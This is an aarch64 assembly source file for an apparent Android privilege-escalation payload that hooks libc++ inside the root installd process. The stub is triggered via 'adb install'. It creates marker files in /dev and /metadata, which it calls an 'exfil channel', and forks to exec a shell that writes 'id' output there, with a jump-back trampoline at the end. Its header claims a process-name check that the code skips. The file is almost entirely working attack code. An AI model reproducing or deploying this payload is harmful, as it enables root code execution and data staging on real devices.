/*
 * P780 libc++ sentry hook stub, installd variant (aarch64, syscalls only).
 *
 * Gate: uid == 0 and /proc/self/comm == "installd", one-shot lock.
 * Trigger: `adb install` makes installd run through its C++ logging path.
 *
 * Payload: mark /dev and /metadata, then try to exec a shell writing `id` into
 * /metadata, to learn what the installd domain (uid 0) may actually do.
 */
    .text

    .global p780_stub_prod
    .type   p780_stub_prod, %function
    .balign 16
p780_stub_prod:
    stp     x0, x1, [sp, #-32]!
    stp     x2, x3, [sp, #16]

    mov     x8, #174                   /* getuid */
    svc     #0
    cbnz    x0, 9f

    /* positive-control build: gate on uid==0 only */

    /* one-shot lock */
    movn    x0, #99
    adr     x1, p780_once_path
    movz    x2, #0x241
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 9f
    mov     x9, x0
    mov     x0, x9
    mov     x8, #57
    svc     #0

    /* /dev marker */
    movn    x0, #99
    adr     x1, p780_dev_marker
    movz    x2, #0x441
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 7f
    mov     x9, x0
    mov     x0, x9
    adr     x1, p780_dev_msg
    mov     x2, #8
    mov     x8, #64
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0

    /* /metadata marker: proves installd can write the exfil channel */
7:  movn    x0, #99
    adr     x1, p780_meta_marker
    movz    x2, #0x441
    movz    x3, #0x1b6
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 6f
    mov     x9, x0
    mov     x0, x9
    adr     x1, p780_meta_msg
    mov     x2, #8
    mov     x8, #64
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0

    /* fork + exec sh -c "id > /metadata/p780_installd_exec" */
6:  mov     x8, #220
    mov     x0, #17
    mov     x1, #0
    mov     x2, #0
    mov     x3, #0
    mov     x4, #0
    svc     #0
    cbnz    x0, 9f
    sub     sp, sp, #32
    adr     x9, p780_sh_name
    str     x9, [sp, #0]
    adr     x9, p780_sh_dashc
    str     x9, [sp, #8]
    adr     x9, p780_sh_cmd
    str     x9, [sp, #16]
    str     xzr, [sp, #24]
    mov     x1, sp
    adr     x0, p780_sh_path
    mov     x2, xzr
    mov     x8, #221
    svc     #0
    movn    x0, #99
    adr     x1, p780_fail_path
    movz    x2, #0x441
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 5f
    mov     x9, x0
    mov     x0, x9
    adr     x1, p780_fail_msg
    mov     x2, #8
    mov     x8, #64
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0
5:  mov     x0, #1
    mov     x8, #93
    svc     #0

8:  add     sp, sp, #16
9:  ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp], #32

    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f

    .inst   0x90000009
    .inst   0x91000129
    .inst   0xd61f0120

    .balign 8
p780_comm_path:
    .asciz  "/proc/self/comm"
p780_comm_expect:
    .ascii  "installd"
p780_once_path:
    .asciz  "/dev/p780_ctrl_once"
p780_dev_marker:
    .asciz  "/dev/p780_installd_marker"
p780_dev_msg:
    .ascii  "INSTALLO"
p780_meta_marker:
    .asciz  "/metadata/p780_installd_marker"
p780_meta_msg:
    .ascii  "METAOK!!"
p780_sh_path:
    .asciz  "/system/bin/sh"
p780_sh_name:
    .asciz  "sh"
p780_sh_dashc:
    .asciz  "-c"
p780_sh_cmd:
    .asciz  "id > /metadata/p780_installd_exec 2>&1"
p780_fail_path:
    .asciz  "/dev/p780_installd_exec_failed"
p780_fail_msg:
    .ascii  "EXECFAIL"

/* ---- self-test variant -------------------------------------------------- */
    .global p780_stub_test
    .type   p780_stub_test, %function
    .balign 16
p780_stub_test:
    stp     x0, x1, [sp, #-32]!
    stp     x2, x3, [sp, #16]
    movn    x0, #99
    adr     x1, p780_test_path
    movz    x2, #0x441
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 5f
    mov     x9, x0
    mov     x0, x9
    adr     x1, p780_test_msg
    mov     x2, #8
    mov     x8, #64
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0
5:  ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp], #32
    ret
p780_test_path:
    .asciz  "/data/user/0/top.dcmqht.p780ipsec/cache/p780_stub_marker"
    .balign 8
p780_test_msg:
    .ascii  "STUBTEST"
